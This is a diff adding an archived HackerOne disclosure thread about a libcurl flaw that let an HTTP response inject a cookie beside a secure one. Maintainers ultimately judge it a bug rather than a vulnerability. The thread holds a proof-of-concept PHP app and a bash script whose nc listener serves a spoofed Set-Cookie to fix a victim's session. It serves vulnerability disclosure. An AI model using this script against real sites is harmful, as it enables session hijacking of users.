@@ -1,0 +1,284 @@
+---
+tags:
+  - type/disclosure
+  - platform/hackerone
+  - severity/high
+  - cwe/session-fixation
+  - env/web
+substate: "not-applicable"
+weakness: "Session Fixation"
+enriched: true
+date: 2022-05-13
+submitted: 2022-05-05T17:48:16.396Z
+bounty_usd: null
+votes: 2
+cve: []
+program: "[[programs/curl|curl]]"
+reporter: "nyymi"
+source: "https://hackerone.com/reports/1560324"
+title: "Cookie injection from non-secure context"
+---
+# Cookie injection from non-secure context
+
+> **Severity:** High | **Bounty:** undisclosed | **Votes:** 2 | **Program:** curl | **Disclosed:** 2022-05-13
+
+- Report: [https://hackerone.com/reports/1560324](https://hackerone.com/reports/1560324)
+- CWE: Session Fixation
+- Submitted: 2022-05-05T17:48:16.396Z
+
+## Timeline
+
+- **Report Filed**
+- **2022-05-05** @nyymi: CWE-384 is likely a bit misleading CWE for this. It's actually just one of the impacts of this issue. Some logic flaw or injection CWE might be more correct in describing this issue perhaps.
+- **2022-05-05** @bagder: Thank you for your report!
+
+We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!
+- **2022-05-05** @nyymi: If I'd have to guess the issue is that the protection against "overriding existing secure cookies" only considers non-domain cookies. This is from the fact that dropping the `domain=somesite.tld` makes the protection work as expected.
+- **2022-05-05** @dgustafsson: FWIW, the relevant portion of the RFC draft seems to be https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis/#section-5.5 item 16.
+- **2022-05-05** @nyymi: s/controlled bit he attacker/controlled by the attacker/g
+- **2022-05-05** @bagder: It's hard to figure out exactly if this is working as intended or if the spec says that this is actually the same cookie. I'll need to read this again.
+- **2022-05-05** @nyymi: Either I've totally misunderstood something here or I've actually stumbled on some rather serious generic vulnerability. It seems to get reproduced with Firefox 100 and Chrome 101:
+
+```
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
+...
+Cookie: SESSIONID=hackerstoken; SESSIONID=victimstoken
+```
+
+Chrome 101:
+```
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+...
+Cookie: SESSIONID=hackerstoken; SESSIONID=victimstoken
+```
+
+This is really really bad.
+- **2022-05-05** @nyymi: Exploiting this requires somewhat active attack, but I still have very hard time believing this is how cookies should work. Please do let me know if there is something I've missed here and this somehow works as intended... I'm really puzzled ATM.
+- **2022-05-05** @nyymi: I think the cookie order might be the key here. The last cookie set should be used I think. I haven't yet been able to make browsers send `hackerstoken` last. Maybe if the path is identical they're sorted by "security" (least secure first, most secure last) or "domain" (least specific first, most specific last)
+- **2022-05-05** @nyymi: Ok, some more testing done:
+- Both Chrome and Firefox reject `Set-Cookie` from HTTP that would override "secure" cookie with same name. But if no secure cookie is present the non-secure cookie can be added. Later if secure cookie is added you can end up with two cookies as above. So `HTTP` first, then `HTTPS` you will have this scenario.
+- If both cookies are present they always seem to be sent in `Cookie: SESSIONID=hackerstoken; SESSIONID=victimstoken` order (prioritising the "more secure" cookie).
+
+So browsers seem to be fine. I'll try to verify this by looking at chromium source code a bit.
+
+libcurl not behaving like this would also seem to confirm that this is a genuine security flaw in curl.
+- **2022-05-05** @bagder: [4.2.2 semantics](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis/#section-4.2.2):
+
+   Although cookies are serialized linearly in the Cookie header field,
+   servers SHOULD NOT rely upon the serialization order.  In particular,
+   if the Cookie header field contains two cookies with the same name
+   (e.g., that were set with different Path or Domain attributes),
+   servers SHOULD NOT rely upon the order in which these cookies appear
+   in the header field.
+- **2022-05-05** @nyymi: So depending on server behaviour browsers could be also affected if the attacker manages to inject the fixed session before the victim visit the target site via `HTTPS`.
+
+Trying to find something as specific has cookie handling in chromium is painful. I think I'll maybe look into this closer later. EDIT: Might be this https://github.com/chromium/chromium/blob/main/net/cookies
+- **2022-05-05** @nyymi: I think the safe way would be to reject set-cookie in this situation like the browsers do.
+But it's currently a bit unclear to me how the browsers decide the cookie order in the response.
+
+It clearly isn't just alpha sorted at least:
+
+```
+Cookie: SESSIONID=xhackerstoken; SESSIONID=yvictimstoken
+```
+```
+Cookie: SESSIONID=yhackerstoken; SESSIONID=xvictimstoken
+```
+Both Firefox and Chrome behave like this.
+- **2022-05-05** @nyymi: I figured it out, I think.
+
+With Firefox the cookies are sorted by creation time:
+`Cookie: SESSIONID=yhackerstoken; SESSIONID=xvictimstoken; FIRST=1; SECOND=1; THIRD=1; LAST=1`
+
+Modifying the cookie doesn't change the order for Firefox, they're still in the creation order:
+`Cookie: SESSIONID=yhackerstoken; SESSIONID=xvictimstoken; FIRST=1; SECOND=2; THIRD=1; LAST=1`
+`Cookie: SESSIONID=yhackerstoken; SESSIONID=somethingelse; FIRST=1; SECOND=2; THIRD=1; LAST=1`
+
+With Chrome the order of the cookies is the modification time. After same changes to cookies we get:
+`Cookie: SESSIONID=yhackerstoken; FIRST=1; THIRD=1; LAST=1; SECOND=2; SESSIONID=somethingelse`
+
+Either way, if server pick up the first cookie value the both Firefox and Chrome are susceptible to early section fixation via HTTP.
+- **2022-05-06** @nyymi: There's a lot of testing to do outside of libcurl's scope, but I guess I'll take that somewhere else now, and not spam this space.
+
+Needless to say this seems to be far far worse than I initially though. I will need to sort the actual impact out a bit more, as there are a lot of moving parts.
+
+It could be that since this issue is so widespread it may require some time to sort out so that the impact is minimized.
+- **2022-05-06** @nyymi: After some more study the browser situation seems kind of ok after all. I initially though that one of the major browsers would have shared the libcurl bug of not preventing cookie overwriting, but it seems I somehow messed up the testing. All major browsers seem to work correctly.
+
+Here's a simple PoC php app that can be used to demonstrate the libcurl vulnerability:
+ ```
+<?php
+
+ini_set('session.cookie_httponly', 1);
+ini_set('session.cookie_secure', 1);
+
+session_start();
+
+if ($_GET['setuser'])
+{
+  $_SESSION['user'] = $_GET['setuser'];
+
+  $baseurl=strtok($_SERVER["REQUEST_URI"], "?");
+  header("Location: $baseurl", true, 302);
+
+  echo "User set to \"" . htmlentities($_SESSION['user']) ."\"\n";
+}
+else
+{
+  echo "User is \"". htmlentities($_SESSION['user']) ."\"\n";
+}
+
+?>
+```
+And the script that can be test the vulnerability:
+```
+#!/bin/bash
+
+# Configuration for the PoC
+TARGET="somesite.tld"
+TPATH="/sessionpoc.php"
+
+# Don't touch after this line
+
+R=$RANDOM
+HACKERNAME="Hacker$R"
+VICTIMNAME="Victim$R"
+
+echo "Hacker's name is: $HACKERNAME"
+echo "Victim's name is: $VICTIMNAME"
+
+curl -s -c tmpcookies$R.txt "https://$TARGET$TPATH?setuser=$HACKERNAME" >/dev/null
+SID=$(grep PHPSESSID tmpcookies$R.txt | awk -F '\t' '{print $7}')
+rm tmpcookies$R.txt
+
+echo "Hacker's PHPSESSID $SID"
+
+echo "1. Fetch URL: https://$TARGET$TPATH?setuser=$VICTIMNAME"
+echo "2. Fetch URL: http://$TARGET:3333/"
+echo "3. Fetch URL: https://$TARGET$TPATH repeatedly"
+
+while true
+do
+  echo -ne "HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=$SID; path=/; domain=$TARGET\r\nContent-Length: 0\r\n\r\n" | nc -v -l -p 3333
+done
+```
+
+Step 2 demonstrates that the insecure context can inject the attackers cookie into libcurl.
+
+When step 3 is repeated with `curl -c cookies.txt -b cookies.txt` libcurl cycles between the two cookie entries. Thus you will see it toggle between the two identities as well.
+
+Depending on the specifics of the application this can get a bit weird to exploit. Either way, the secure cookies can be overwritten from insecure context, which is the root cause of this vulnerability.
+
+In situations where the configuration of the target server can be adjusted a mitigation for vulnerable libcurl versions is to use `__Host-` session cookies since this will block the `Set-Cookie` if `domain` is set (effectively blocking the attack vector).
+- **2022-05-06** @bagder: I'm still not convinced.
+
+1. Having two cookies with the same name is not an error in cookie land and the order of them in not to be assumed
+2. Cookies don't check/verify protocols/port numbers so adding cookies in HTTP vs HTTPS has worked since the 90s
+
+The question is therefore only if this issue describes a new trick that goes outside of what was always possible or not and if this new trick actually opens up for anything that wasn't already possible.
+- **2022-05-06** @nyymi: I think this is a security issue because it allows any HTTP access at any time to override existing HTTPS set secure cookie.
+
+In specific this violates the rule pointed out by dgustafsson:
+```
+   16.  If the cookie's secure-only-flag is false, and the scheme
+        component of request-uri does not denote a "secure" protocol,
+        then abort these steps and ignore the cookie entirely if the
+        cookie store contains one or more cookies that meet all of the
+        following criteria:
+
+        1.  Their name matches the name of the newly-created cookie.
+
+        2.  Their secure-only-flag is true.
+
+        3.  Their domain domain-matches the domain of the newly-created
+            cookie, or vice-versa.
+
+        4.  The path of the newly-created cookie path-matches the path
+            of the existing cookie.
+
+        Note: The path comparison is not symmetric, ensuring only that a
+        newly-created, non-secure cookie does not overlay an existing
+        secure cookie, providing some mitigation against cookie-fixing
+        attacks.  That is, given an existing secure cookie named 'a'
+        with a path of '/login', a non-secure cookie named 'a' could be
+        set for a path of '/' or '/foo', but not for a path of '/login'
+        or '/login/en'.
+```
+
+All browsers implementing cookies adhere to this rule and reject the non-secure HTTP cookie attempting to override the Secure cookie already set.
+
+libcurl *attempts* to do this, but fails. The code is here:
+https://github.com/curl/curl/blob/a8a1dd8ecc1e853953e7dcbca282c60454ffaaec/lib/cookie.c#L1039
+
+However, this checking is thwarted by the fact that the replacement logic is in the same loop. The replacement lookup and checking if the cookie "overlay" must be done separately since the search criteria are not the same.
+
+When separated the overlay check actually works and prevents the attack from working. See attached patch to see what I mean.
+- **2022-05-06** @bagder: It does not *override* it though. It adds one.
+- **2022-05-06** @bagder: I see this as a variation of the old and known problem that you can set a cookie in a non-secure context that appears in the secure context, combined with the fact that you can have multiple cookies using the same name. Sure, this might also point out a bug, but does it really open a new attack surface?
+
+The `__Secure-` prefix was introduced to cookies to *properly* address the problem with cookies going between secure/insecure context.
+- **2022-05-06** @nyymi: > It does not override it though. It adds one.
+
+It does override it in practice, however. In further processing libcurl will pick up whichever cookie happens to match first (which depends on the order of the entries in the list, and can change run to run when the file is updated).
+
+> I see this as a variation of the old and known problem that you can set a cookie in a non-secure context that appears in the secure context, combined with the fact that you can have multiple cookies using the same name.
+
+Sure. This is what it is, but there is an attempt already in the libcurl code to prevent this specific attack scenario. This code is broken.
+
+> Sure, this might also point out a bug, but does it really open a new attack surface?
+
+In my opinion it does, as demonstrated by this PoC and a proposed fix to prevent the attack from working.
+
+With this fix the attacker must be able to inject their non-secure cookie *before* the secure one exists. This significantly reduces the window of opportunity for the attacker. This is exactly why the rule 16 was introduced in the first place, and why browsers also go into all these lengths to implement it. That's why libcurl also attempts to prevent this attack (but fails to do so currently).
+
+> The __Secure- prefix was introduced to cookies to properly address the problem with cookies going between secure/insecure context.
+
+Yes, as well as `__Host-`.  In a perfect world all web applications would use all the available security features.
+
+Unfortunately libcurl can't do anything about existing services and web applications not using them. What libcurl can do is to make it as hard as possible to exploit the less secure applications. I think it should. libcurl already attempting to address this issue (even though it is failing to do so) seems to suggest that this has been considered important.
+
+I think I've laid our my reasoning in enough detail now.
+- **2022-05-06** @nyymi: I promised myself I had explained this in enough detail, but, eh. Couple of scenarios I want to provide which should perhaps clarify why I see this is a problem. Both of these scenarios *do* require Man in the Middle position (or alternatively a possibility to naturally host content on the target host.. which is somewhat less likely)
+
+*Scenario: Webshop*
+
+Background: This web application is following the best practices and introduces a new session cookie on successful login. Thus it is not possible to perform classic "session fixation" attack where the attacker gains access to victims session. Yet, this can currently be exploited if libcurl is used.
+
+- Attacker logs on the webshop and fills a shopping cart with items
+- Victim logs on to a webshop and fills up a shopping cart
+- Victim starts a payment process. If the app fetches any resources over HTTP from the host, attacker is able to introduce `Set-Cookie` that replaces the cookie of the victim, and thus forces the app to use the attacker's session instead
+- Victim pays the attacker's shopping cart
+
+
+*Scenario: Cloud file storage service*
+
+Background: This web application is following the best practices and introduces a new session cookie on successful login. Thus it is not possible to perform classic "session fixation" attack where the attacker gains access to victims session. Yet, this can currently be exploited if libcurl is used.
+
+- Attacker has created an account on the same service and is waiting for victim to access the service
+- Victim logs on the the file storage service
+- If the app fetches any resources over HTTP from the host, attacker is able to introduce `Set-Cookie` that replaces the cookie of the victim, and thus forces the app to use the attacker's session instead
+- Any uploads of sensitive information will be uploaded to account controlled by the attacker
+
+Neither of these scenarios would work if this vulnerability would be fixed.
+- **2022-05-06** @nyymi: Any non-TLS HTTP request is enough if the application either follows redirects or parses and processes further links (say for example browser loading resources from HTML pages). If redirects are followed the access can be pointed to http port on the target website or if links are followed a link to http port on the target site can be added.
+
+The response to the forthcoming request can then be spoofed to perform the `Set-Cookie` attack as described.
+- **2022-05-12** @bagder: After much consideration.
+
+The [security section of the 6265bis draft](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis/#section-8) - the in progress document that is supposed to (soon?) update [RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265), makes it clear that redirecting from a secure context (HTTPS) to an insecure one (HTTP) with the same host name is a known bad move and there are multiple documented ways that redirect can cause problems.
+
+This exact problem is not included there of course because this is a bug, but a server that does this redirect opens itself for a slew of other cookie related risks already. Not to mention some more sever attacks than what is onlined here.
+
+This attack relies on a successful MITM of an HTTP site (without affecting the HTTPS one) and careful timing, it also requires that the HTTPS site performs the taboo operation of redirecting over to its HTTP counterpart.
+
+Since this attack doesn't replace the HTTPS cookie, it also requires the attacked site not handle the duplicate (or handle it wrongly). It also requires that the added cookie value is all which is needed to trick the site, which basically means that prevention methods in use virtually everywhere like CSRF are circumvented or not used. Additionally, for a tricked payment, it basically requires that you're performing the attack 10 years ago given how the token auth flow is for payment providers these days (not to mention that the invoice address on the attackers shoppingcart won't match the card issued etc etc).
+
+Given the amount of stars that need to be aligned for this to be the vector of an attack, you'd be far more likelier to use something else.
+
+This is a bug, but we think labeling it with a CVE risks crying wolf and further water down the concept of what a CVE is.
+
+We do not consider this a curl security vulnerability.
+- **Report Not Applicable**
+- **Agreed On Going Public**
+- **Agreed On Going Public**
+- **Report Became Public**
